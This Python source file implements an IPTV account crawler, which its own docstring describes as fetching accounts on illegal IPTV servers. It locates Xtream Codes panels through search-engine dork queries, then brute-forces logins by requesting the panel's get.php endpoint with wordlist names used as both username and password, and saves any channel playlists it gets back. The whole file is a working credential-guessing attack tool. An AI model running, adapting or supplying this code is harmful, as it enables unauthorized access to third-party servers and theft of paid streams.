import os
import random
import time
from urllib.parse import urlparse
import requests
from googlesearch import search
import pyprind

"""Crawler
Class that handles the crawling process that fetch accounts on illegal IPTVs

Authors:
Claudio Ludovico (@Ludo237)
Pinperepette (@Pinperepette)
Arm4x (@Arm4x)
"""
class Crawler(object):
    # version
    version = "1.2.5"
    # output default directory
    outputDir = "output"
    # language default directory
    languageDir = "languages"
    # string used to exploit the CMS
    basicString = "/get.php?username=%s&password=%s&type=m3u&output=mpegts"
    # queries used to search IPTV servers across search engines
    searchQueries = [
        "Xtream Codes v1.0.59.5",
        "inurl:get.php?username= password= type=m3u",
        "inurl:c/ player_api.php",
        "inurl::8080/get.php?username=",
        "inurl::8000/get.php?username="
    ]

    def __init__(self, language="it"):
        """Default constructor"""
        self.language = language.lower()
        self.parsedUrls = []
        self.foundedAccounts = 0

    def change_language(self, language="it"):
        """Set the language you want to use to brute force names"""
        if os.path.isfile(os.path.join(self.languageDir, language + ".txt")):
            self.language = language
            return True
        else:
            return False

    def add_custom_url(self, url):
        """Allow manually adding a target server URL"""
        if not url:
            return False
        if not url.startswith("http://") and not url.startswith("https://"):
            url = "http://" + url
        parsed = urlparse(url)
        clean_url = parsed.scheme + "://" + parsed.netloc
        if clean_url not in self.parsedUrls:
            self.parsedUrls.append(clean_url)
            return True
        return False

    def search_links(self, custom_query=None):
        """Fetch IPTV server links from web search engines"""
        queries = [custom_query] if custom_query else self.searchQueries
        found = 0

        for query in queries:
            try:
                for url in search(query, num_results=15):
                    parsed = urlparse(url)
                    base_url = parsed.scheme + "://" + parsed.netloc
                    if base_url and base_url not in self.parsedUrls:
                        self.parsedUrls.append(base_url)
                        found += 1
                    if len(self.parsedUrls) >= 50:
                        break
            except Exception as e:
                print(f"Error fetching links for query '{query}': {e}")

        return found

    def search_accounts(self, url=None):
        """Search Accounts"""
        if not self.parsedUrls:
            return "You must fetch or add some URLs first"
        try:
            if not url:
                url = random.choice(self.parsedUrls)
            fileName = os.path.join(self.languageDir, self.language + ".txt")
            if not os.path.exists(fileName):
                return "Language file does not exist"
                
            fileLength = self.file_length(fileName)
            try:
                progressBar = pyprind.ProgBar(fileLength, title="Fetching account from " + url + " this might take a while.", stream=1, monitor=True)
            except Exception:
                progressBar = pyprind.ProgBar(fileLength, title="Fetching account from " + url + " this might take a while.", stream=1, monitor=False)

            self.foundedAccounts = 0
            with open(fileName, "r", encoding="utf-8", errors="ignore") as f:
                rows = f.readlines()
            
            headers = {'User-Agent': 'Mozilla/5.0'}
            for row in rows:
                username = row.strip()
                if not username:
                    continue
                target_url = url + self.basicString % (username, username)
                try:
                    res = requests.get(target_url, headers=headers, timeout=5)
                    fetched = res.text
                    if len(fetched) > 0 and "#EXTM3U" in fetched:
                        domain = url.replace("http://", "").replace("https://", "").strip("/")
                        new_path = os.path.join(self.outputDir, domain)
                        self.create_file(username, new_path, fetched)
                except requests.RequestException:
                    pass
                
                progressBar.update()

            if url in self.parsedUrls:
                self.parsedUrls.remove(url)

            if self.foundedAccounts != 0:
                return "Search done, account founded on " + url + ": " + str(self.foundedAccounts)
            else:
                return "No results for " + url
        except Exception as e:
            return f"Ops something went wrong: {e}"

    def create_file(self, row, newPath, fetched):
        """Create File"""
        if not os.path.exists(newPath):
            os.makedirs(newPath)
        filePath = os.path.join(newPath, f"tv_channels_{row.strip()}.m3u")
        with open(filePath, "w", encoding="utf-8") as outputFile:
            outputFile.write(fetched)
        self.foundedAccounts += 1

    def file_length(self, fileName):
        """File Length"""
        i = 0
        with open(fileName, "r", encoding="utf-8", errors="ignore") as f:
            for i, _ in enumerate(f, start=1):
                pass
        return i
